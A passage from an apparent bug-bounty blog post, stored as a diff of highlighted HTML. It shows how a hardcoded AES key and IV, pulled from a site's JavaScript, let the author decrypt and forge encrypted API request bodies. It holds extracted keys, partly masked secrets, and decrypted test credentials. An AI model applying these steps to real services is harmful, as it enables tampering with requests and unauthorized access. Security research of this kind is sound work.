+        <span class="na">bookingApiDomain</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://bookings.abc.com</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">blogsApiDomain</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://secure.abc.com</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">analyticsDomain</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://analytics.abc.com</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">cdnPath</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://cdn.abc.com</span><span class="dl">'</span><span class="p">,</span>       
+        <span class="na">s3accessKeyId</span><span class="p">:</span> <span class="dl">'</span><span class="s1">test-############</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">s3secretKey</span><span class="p">:</span> <span class="dl">'</span><span class="s1">test-############</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">s3Region</span><span class="p">:</span> <span class="dl">'</span><span class="s1">west</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">dataHasKey</span><span class="p">:</span> <span class="dl">'</span><span class="s1">###################=</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">dataIVKey</span><span class="p">:</span> <span class="dl">'</span><span class="s1">jm8lgqa3j1d0ajus</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">zendesk</span><span class="p">:</span> <span class="dl">'</span><span class="s1">#   ##########################</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">giftCardUrl</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://join.abc.com/gift-card/</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">ASSET_CDN_PATH</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://assets.abc.com</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">consoleEnv</span><span class="p">:</span> <span class="dl">'</span><span class="s1">production</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">recaptchaV2Key</span><span class="p">:</span> <span class="dl">'</span><span class="s1">###################-kAQFKNGH-</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">SHOPBACK_URL_DYNAMIC</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://shopback.abc.org/aff_l</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">SHOPBACK_MERCHANT_ID</span><span class="p">:</span> <span class="dl">'</span><span class="s1">#########</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">encryptionKeys</span><span class="p">:</span> <span class="dl">'</span><span class="s1">["##_analytics_detail||VWlRMVRtTnllWEJVSVRCdUo=","club_membership_detail||RFZEVW1WMEtFQlJKSDA9"]</span><span class="dl">'</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>After analyzing the code, finally i came to a conclusion that the application was loading resources from another CDN too and this main.js file only has the Initialization vector which was referred as <code class="language-plaintext highlighter-rouge">dataIVKey</code> in the code.</p>
+
+<p>Let’s load the application in the browser and check the encryption in the REST API.</p>
+
+<figure>
+<img src="reqandresp.png" />
+<figcaption>Fig 1. Request and response</figcaption>
+</figure>
+
+<p>Alright! let’s check the JS source files in the CDN subdomain <code class="language-plaintext highlighter-rouge">cdnPath: 'https://cdn.abc.com'</code>. The subdomain has lots of files but there was only one file which is different than the other files <strong><em>app.js</em></strong>. The app.js file contains the below details which we need for our further exploitation.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">abc</span><span class="p">.</span><span class="nx">factory</span><span class="p">(</span><span class="dl">'</span><span class="s1">SiteSettingService</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span>
+  <span class="dl">'</span><span class="s1">$cookies</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">$http</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">$q</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">SiteSettings</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">$rootScope</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">UrlFormatter</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">LocalStorage</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">$location</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">MessageModal</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">blockUI</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">EncryptDecrypt</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">SearchConditions</span><span class="dl">'</span>
+  <span class="p">]</span>
+</code></pre></div></div>
+
+<p>The JS file has the function to encrypt and decrypt the API body in the HTTP request and response. Searching the keyword <code class="language-plaintext highlighter-rouge">encrypt</code> led me right into the encryt and decrypt function code as below.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">abc</span><span class="p">.</span><span class="nx">factory</span><span class="p">(</span><span class="dl">'</span><span class="s1">EncryptDecrypt</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span>
+  <span class="dl">'</span><span class="s1">AppSettings</span><span class="dl">'</span><span class="p">,</span>
+  <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="p">{</span>
+      <span class="na">encryptKEY</span><span class="p">:</span> <span class="dl">'</span><span class="s1">UiQ1TmNyeXBUITBuJDVDUmV0KEBRJH0=</span><span class="dl">'</span><span class="p">,</span>
+      <span class="na">setkey</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">encryptKEY</span> <span class="o">=</span> <span class="nx">t</span>
+      <span class="p">},</span>
+      <span class="na">encrypt</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">encryptKEY</span><span class="p">,</span>
+        <span class="nx">n</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">jm8lgqa3j1d0ajus</span><span class="dl">'</span><span class="p">,</span>
+        <span class="nx">r</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">t</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">e</span><span class="p">),</span> <span class="p">{</span>
+          <span class="na">iv</span><span class="p">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">n</span><span class="p">),</span>
+          <span class="na">padding</span><span class="p">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">pad</span><span class="p">.</span><span class="nx">Pkcs7</span><span class="p">,</span>
+          <span class="na">mode</span><span class="p">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">mode</span><span class="p">.</span><span class="nx">CBC</span>
+        <span class="p">}).</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">---</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">n</span><span class="p">)</span>
+      <span class="p">},</span>
+      <span class="na">decrypt</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">---</span><span class="dl">'</span><span class="p">),</span>
+        <span class="nx">n</span> <span class="o">=</span> <span class="nx">browserCrypto</span><span class="p">.</span><span class="nx">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="nx">e</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="dl">'</span><span class="s1">base64</span><span class="dl">'</span><span class="p">),</span>
+        <span class="nx">r</span> <span class="o">=</span> <span class="nx">browserCrypto</span><span class="p">.</span><span class="nx">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="nx">e</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="dl">'</span><span class="s1">base64</span><span class="dl">'</span><span class="p">),</span>
+        <span class="nx">a</span> <span class="o">=</span> <span class="nx">browserCrypto</span><span class="p">.</span><span class="nx">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">encryptKEY</span><span class="p">),</span>
+        <span class="nx">o</span> <span class="o">=</span> <span class="nx">browserCrypto</span><span class="p">.</span><span class="nx">createDecipheriv</span><span class="p">(</span><span class="dl">'</span><span class="s1">aes256</span><span class="dl">'</span><span class="p">,</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">n</span><span class="p">),</span>
+        <span class="nx">i</span> <span class="o">=</span> <span class="nx">o</span><span class="p">.</span><span class="nx">_update</span><span class="p">(</span><span class="nx">r</span><span class="p">),</span>
+        <span class="nx">s</span> <span class="o">=</span> <span class="nx">o</span><span class="p">.</span><span class="nx">final</span><span class="p">(),</span>
+        <span class="nx">l</span> <span class="o">=</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="nx">browserCrypto</span><span class="p">.</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">concat</span><span class="p">([</span><span class="nx">i</span><span class="p">,</span>
+        <span class="nx">s</span><span class="p">])).</span><span class="nx">toString</span><span class="p">();</span>
+        <span class="k">return</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">l</span><span class="p">)</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">])</span>
+</code></pre></div></div>
+
+<p>By reading the above code we clearly have an idea of what are the tools are required to break down this API encryption wall.</p>
+
+<h3 id="handy-tools-to-break-the-wall">Handy tools to break the wall</h3>
+<p>Encryption key = UiQ1TmNyeXBUITBuJDVDUmV0KEBRJH0=
+IV = jm8lgqa3j1d0ajus
+Encryption Mode = CBC
+Encryption Algorithm = AES</p>
+
+<h2 id="lets-break">Let’s break</h2>
+
+<p>I used the online AES decruption application you can find it <a href="https://www.devglan.com/online-tools/aes-encryption-decryption">here</a>.
+Before start decrypting the json body let’s go through the code first. The below line in the code shows that the final payload is created by adding the encrypted payload and <code class="language-plaintext highlighter-rouge">---</code> dashes and then follwed by the base64 encoded IV.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">return</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">e</span><span class="p">),</span> <span class="p">{</span>
+          <span class="na">iv</span><span class="p">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">n</span><span class="p">),</span>
+          <span class="na">padding</span><span class="p">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">pad</span><span class="p">.</span><span class="nx">Pkcs7</span><span class="p">,</span>
+          <span class="na">mode</span><span class="p">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">mode</span><span class="p">.</span><span class="nx">CBC</span>
+        <span class="p">}).</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">---</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">n</span><span class="p">)</span>        
+</code></pre></div></div>
+<p><strong><em>btoa()</em></strong> method is used for encoding a string in base-64 format, so the IV will be encoded in base64 format.</p>
+
+<p>Let’s break down the final payload  the API is sending to the server.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"data"</span><span class="p">:</span><span class="s2">"Ht2YM+y/yp4cn11iaWs/PmqQlSuLgrxMZwrQKnAt+qwRBYL2gt3uCHtPWC4soU1j0861mHg4Ij2jSJ0sq5R4iQK0lJ25hRjDf8OqwpNG97jv5jcCSNSFyYhjLqZYRGeFTLcxM7p4Jj9dl54LcXYWCPgAinKdQiPx/y9NC1g02g06HtCLFNFZlrTtJXPoFA70vkuT3VF84pHS+0yX3tVS0d0+b0AYlrePSuF8qxfnGGCcnhcbD/tCqesu3gFp3VCvZUaAnc9SzQlpF04a/D3R+izDG97FHEIFDsULmX0YOW5tEoUcsWRbDTfuswChDmrpNx6wMK8VR5+oSMF5r/y8eWEak0Xiaa9vc8J/TIt+j26pvDIgHRzCwfe7E9NpbBgiTt9OqoyZEyL61PRZ5UybCqqfj659WBKbF3B6ThQNQWw56CJDUTGp3sK59izgl4Bn3P76MvlpDC7rg4JTmprlk1BqxvMjmG/vqZn6IXUDR+TNHr+6zCfSTDkbeYKojs663BvddsrJIuhzgFryHe3DUZFnOahR1ViDanCahRZFkK97mfxUwHfAfJqkWkkpEhpAEV1ZUiBUpohmCWIYxjxtOBo9M9oiAxcAHZW9rbVu1X1KyadnRnO/i4JU40e8EmwsokGoufbi5Z5wOgK9sEO9LFTDH5LnF+UwXBM25oI3UFmwWrrYljNPdexm4iksslRUZGx1FQa1BlHQ8hGH+ch+ZOFu/AI8wfWx0v6lUiAx8ZTpmb+JQDb90S38rMIuh08frCixM9uyNiP1ue/W6lPW4GThtLSXcT+Ua+d4xrIHaEXP4mNNSUIQwUSo2m7kq3OoxNpbvjd3EtM9EkyJEIXcI0nn7cXuTfRpmJNMzJ0mrx6wMgJkPGJVrttNfhP4/FUXj/RrG4KYt+bpHrd7vExXNYYQCHRCKjRUzvr1ON99wBkaSHzvKHz9x/i0IMQ9kNBNB3Bge9mTsHaYs3nFqQOXS+HkASZkmc0jF+dK33X2fv8tBfJvQF4FL2AFPKyvPId3cq+RWLmvWde9h19ewuLBX/0adpiDea7HgnnIH3NewQhcrCZvfWodqtmhPKowtwk1---am04bGdxYTNqMWQwYWp1cw=="</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>In the last line in the final payload there are 3 <code class="language-plaintext highlighter-rouge">---</code> dashes and followed by base64 encoded string which is the dataIV.</p>
+
+<p>Alright! let decrypt the request payload and let’s see how can we create an actual impact.</p>
+
+<h3 id="decrypting-the-request-data">Decrypting the request data</h3>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"textToEncrypt"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"textToDecrypt"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Ht2YM+y/yp4cn11iaWs/PmqQlSuLgrxMZwrQKnAt+qwRBYL2gt3uCHtPWC4soU1j0861mHg4Ij2jSJ0sq5R4iQK0lJ25hRjDf8OqwpNG97jv5jcCSNSFyYhjLqZYRGeFTLcxM7p4Jj9dl54LcXYWCPgAinKdQiPx/y9NC1g02g06HtCLFNFZlrTtJXPoFA70vkuT3VF84pHS+0yX3tVS0d0+b0AYlrePSuF8qxfnGGCcnhcbD/tCqesu3gFp3VCvZUaAnc9SzQlpF04a/D3R+izDG97FHEIFDsULmX0YOW5tEoUcsWRbDTfuswChDmrpNx6wMK8VR5+oSMF5r/y8eWEak0Xiaa9vc8J/TIt+j26pvDIgHRzCwfe7E9NpbBgiTt9OqoyZEyL61PRZ5UybCqqfj659WBKbF3B6ThQNQWw56CJDUTGp3sK59izgl4Bn3P76MvlpDC7rg4JTmprlk1BqxvMjmG/vqZn6IXUDR+TNHr+6zCfSTDkbeYKojs663BvddsrJIuhzgFryHe3DUZFnOahR1ViDanCahRZFkK97mfxUwHfAfJqkWkkpEhpAEV1ZUiBUpohmCWIYxjxtOBo9M9oiAxcAHZW9rbVu1X1KyadnRnO/i4JU40e8EmwsokGoufbi5Z5wOgK9sEO9LFTDH5LnF+UwXBM25oI3UFmwWrrYljNPdexm4iksslRUZGx1FQa1BlHQ8hGH+ch+ZOFu/AI8wfWx0v6lUiAx8ZTpmb+JQDb90S38rMIuh08frCixM9uyNiP1ue/W6lPW4GThtLSXcT+Ua+d4xrIHaEXP4mNNSUIQwUSo2m7kq3OoxNpbvjd3EtM9EkyJEIXcI0nn7cXuTfRpmJNMzJ0mrx6wMgJkPGJVrttNfhP4/FUXj/RrG4KYt+bpHrd7vExXNYYQCHRCKjRUzvr1ON99wBkaSHzvKHz9x/i0IMQ9kNBNB3Bge9mTsHaYs3nFqQOXS+HkASZkmc0jF+dK33X2fv8tBfJvQF4FL2AFPKyvPId3cq+RWLmvWde9h19ewuLBX/0adpiDea7HgnnIH3NewQhcrCZvfWodqtmhPKowtwk1"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"secretKey"</span><span class="p">:</span><span class="w"> </span><span class="s2">"UiQ1TmNyeXBUITBuJDVDUmV0KEBRJH0="</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"mode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"CBC"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"keySize"</span><span class="p">:</span><span class="w"> </span><span class="mi">256</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"output"</span><span class="p">:</span><span class="w"> </span><span class="s2">"eyJmaXJzdF9uYW1lIjoidGVzdCIsImxhc3RfbmFtZSI6InVzZXIiLCJlbWFpbCI6Im5qQHR2aHNlYy5jb20iLCJwaG9uZSI6IjkxODc5NDU2MzIxNCIsInBhc3N3b3JkIjoiUGFzc0AxMjMiLCJjb25maXJtX3Bhc3N3b3JkIjoiUGFzc0AxMjMiLCJpc191bnN1YnNjcmliZWQiOnRydWUsImNhcHRjaGEiOiIwM0FGWV9hOFhONGNCUVFjMGRnQnNlYTRKc1NEdEpuYTFGb09yX1BWYlFOeGYwSnpLZEdLRXNyeWpfWXNKazlQQ05aaDhWNmV3R1dLam1xQkMyQzJ0NWNvSmR4OWFaZ00wUGRCbDRfMzQ1dTE0MlZrXzhDT2c4R3Z4dXRmRjJvQ1p6WGVUTVdnVmNXMlpnMzFMNWszd3VXVkVnSlFnQXJOZ1E0VUhwYW5BQ1lkeEZpTENRYl84SUpTMWdEbVNKY3pZZHRYZ1kybnNBOGQ3Sl9sd0xJNHJnb1Y1Z2IwVXAzWnJSUEZKTnduUk4tS3h0d0dtRGJpYjk2TF9ZbDF6Ym03TFZjSkJNRzZhbDJyMEw1dGt1eFdsdTV0RTZ4MTIzYWNFQ0lQUVJkMktKN2Fwc1owbkd3VF9GdFEtMnJCbjVRTDJtU0x5a0tlQ3ZsNFE1TUphZlR6OTV6ODNJcEs5QVZWUkwwRWl5dENVWjhSQ205NzRoOV9xTTVLa091RXoxQmU3THpMRDJFUzNpNjJQbHZvUGZ6UXlMV3RaUWNSSDRPTWhvcTlMMkduUXVTbE5SaHRqNGVycVRhdkV3eC1ZQklPNnpqeFdWWnBtTm5LWG1uREk0amZNa3FTUk1EaTVqdFFHeXYxQ0tMRVMyRHU0MTFkaGNYR3ZqVVhQSUh3SUlrTDhCdl9weWlENmJSTkdHdXJJSkhEWTZFdDlzUVBRbWJmU2JxQnYxNm1Fd0dxbEdmMWk4LThMbUQ1RSIsInZlcnNpb24iOiJ2MiIsInJlY3RWaWV3IjoidnVlIiwic291cmNlIjoiTG9naW5BY3Rpdml0eSJ9"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"dataFormat"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Base64"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"iv"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jm8lgqa3j1d0ajus"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>decode the base64 encoded output from the above</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"first_name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"test"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"last_name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"user"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"nj@tvhsec.com"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"phone"</span><span class="p">:</span><span class="w"> </span><span class="s2">"918794563214"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Pass@123"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"confirm_password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Pass@123"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"is_unsubscribed"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"captcha"</span><span class="p">:</span><span class="w"> </span><span class="s2">"03AFY_a8XN4cBQQc0dgBsea4JsSDtJna1FoOr_PVbQNxf0JzKdGKEsryj_YsJk9PCNZh8V6ewGWKjmqBC2C2t5coJdx9aZgM0PdBl4_345u142Vk_8COg8GvxutfF2oCZzXeTMWgVcW2Zg31L5k3wuWVEgJQgArNgQ4UHpanACYdxFiLCQb_8IJS1gDmSJczYdtXgY2nsA8d7J_lwLI4rgoV5gb0Up3ZrRPFJNwnRN-KxtwGmDbib96L_Yl1zbm7LVcJBMG6al2r0L5tkuxWlu5tE6x123acECIPQRd2KJ7apsZ0nGwT_FtQ-2rBn5QL2mSLykKeCvl4Q5MJafTz95z83IpK9AVVRL0EiytCUZ8RCm974h9_qM5KkOuEz1Be7LzLD2ES3i62PlvoPfzQyLWtZQcRH4OMhoq9L2GnQuSlNRhtj4erqTavEwx-YBIO6zjxWVZpmNnKXmnDI4jfMkqSRMDi5jtQGyv1CKLES2Du411dhcXGvjUXPIHwIIkL8Bv_pyiD6bRNGGurIJHDY6Et9sQPQmbfSbqBv16mEwGqlGf1i8-8LmD5E"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"v2"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"rectView"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vue"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"source"</span><span class="p">:</span><span class="w"> </span><span class="s2">"LoginActivity"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now we have successfully decoded the JSON body and now we have to construct a fully working JSON payload to send it to the server, for that we have to contruct a payload as below in the js code.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">return</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">e</span><span class="p">),</span> <span class="p">{</span>
+          <span class="na">iv</span><span class="p">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">n</span><span class="p">),</span>
+          <span class="na">padding</span><span class="p">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">pad</span><span class="p">.</span><span class="nx">Pkcs7</span><span class="p">,</span>
+          <span class="na">mode</span><span class="p">:</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">mode</span><span class="p">.</span><span class="nx">CBC</span>
+        <span class="p">}).</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">---</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">n</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Valid request body = Encrypted payload + <code class="language-plaintext highlighter-rouge">---</code> + base64 encoded IV</p>
+
+<p><strong>Encrypted Payload</strong></p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"textToEncrypt"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\n</span><span class="s2">  </span><span class="se">\"</span><span class="s2">first_name</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">enc</span><span class="se">\"</span><span class="s2">,</span><span class="se">\n</span><span class="s2">  </span><span class="se">\"</span><span class="s2">last_name</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">user</span><span class="se">\"</span><span class="s2">,</span><span class="se">\n</span><span class="s2">  </span><span class="se">\"</span><span class="s2">email</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">nj+1@tvhsec.com</span><span class="se">\"</span><span class="s2">,</span><span class="se">\n</span><span class="s2">  </span><span class="se">\"</span><span class="s2">phone</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">918794563214</span><span class="se">\"</span><span class="s2">,</span><span class="se">\n</span><span class="s2">  </span><span class="se">\"</span><span class="s2">password</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">Pass@123</span><span class="se">\"</span><span class="s2">,</span><span class="se">\n</span><span class="s2">  </span><span class="se">\"</span><span class="s2">confirm_password</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">Pass@123</span><span class="se">\"</span><span class="s2">,</span><span class="se">\n</span><span class="s2">  </span><span class="se">\"</span><span class="s2">is_unsubscribed</span><span class="se">\"</span><span class="s2">: true,</span><span class="se">\n</span><span class="s2">  </span><span class="se">\"</span><span class="s2">captcha</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">03AFY_a8XN4cBQQc0dgBsea4JsSDtJna1FoOr_PVbQNxf0JzKdGKEsryj_YsJk9PCNZh8V6ewGWKjmqBC2C2t5coJdx9aZgM0PdBl4_345u142Vk_8COg8GvxutfF2oCZzXeTMWgVcW2Zg31L5k3wuWVEgJQgArNgQ4UHpanACYdxFiLCQb_8IJS1gDmSJczYdtXgY2nsA8d7J_lwLI4rgoV5gb0Up3ZrRPFJNwnRN-KxtwGmDbib96L_Yl1zbm7LVcJBMG6al2r0L5tkuxWlu5tE6x123acECIPQRd2KJ7apsZ0nGwT_FtQ-2rBn5QL2mSLykKeCvl4Q5MJafTz95z83IpK9AVVRL0EiytCUZ8RCm974h9_qM5KkOuEz1Be7LzLD2ES3i62PlvoPfzQyLWtZQcRH4OMhoq9L2GnQuSlNRhtj4erqTavEwx-YBIO6zjxWVZpmNnKXmnDI4jfMkqSRMDi5jtQGyv1CKLES2Du411dhcXGvjUXPIHwIIkL8Bv_pyiD6bRNGGurIJHDY6Et9sQPQmbfSbqBv16mEwGqlGf1i8-8LmD5E</span><span class="se">\"</span><span class="s2">,</span><span class="se">\n</span><span class="s2">  </span><span class="se">\"</span><span class="s2">version</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">v2</span><span class="se">\"</span><span class="s2">,</span><span class="se">\n</span><span class="s2">  </span><span class="se">\"</span><span class="s2">rectView</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">vue</span><span class="se">\"</span><span class="s2">,</span><span class="se">\n</span><span class="s2">  </span><span class="se">\"</span><span class="s2">source</span><span class="se">\"</span><span class="s2">: </span><span class="se">\"</span><span class="s2">LoginActivity</span><span class="se">\"\n</span><span class="s2">}"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"textToDecrypt"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"secretKey"</span><span class="p">:</span><span class="w"> </span><span class="s2">"UiQ1TmNyeXBUITBuJDVDUmV0KEBRJH0="</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"mode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"CBC"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"keySize"</span><span class="p">:</span><span class="w"> </span><span class="mi">256</span><span class="p">,</span><span class="w">
